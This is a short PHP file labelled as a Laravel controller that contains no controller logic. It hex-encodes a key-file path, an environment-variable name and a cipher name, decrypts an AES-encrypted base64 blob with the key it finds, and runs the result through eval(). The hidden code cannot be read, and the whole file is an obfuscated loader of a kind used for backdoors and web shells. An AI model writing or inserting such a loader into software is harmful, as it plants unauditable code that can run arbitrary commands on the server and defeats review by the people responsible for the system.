<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('3L8q1j6F2PDbB8bAIl8uRg==');

$c=base64_decode(

'QGkBCKWuoK4jF+/Co7lMKQQg7x5+fjdUqm2YoURLGMpdDidkhbDqf3BOI3W1RTWW84Ar7YXArpEy' .
'2zj8THTB5wuOYS0u/DFyX+J/3awkTOjA4OLEyxM14uNnoQw+WsTnksEKNEduHMzTeP8cMCO8VMyQ' .
'ii8SzLoEGWw4NnERVexEFDdEoHjmytVW5qucdJw9q8l1LxbZehSxawusOMUl+h6O8bsJyO3XpHFQ' .
'yJCJag685GRjaNCtRPSe03/aS0vG'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

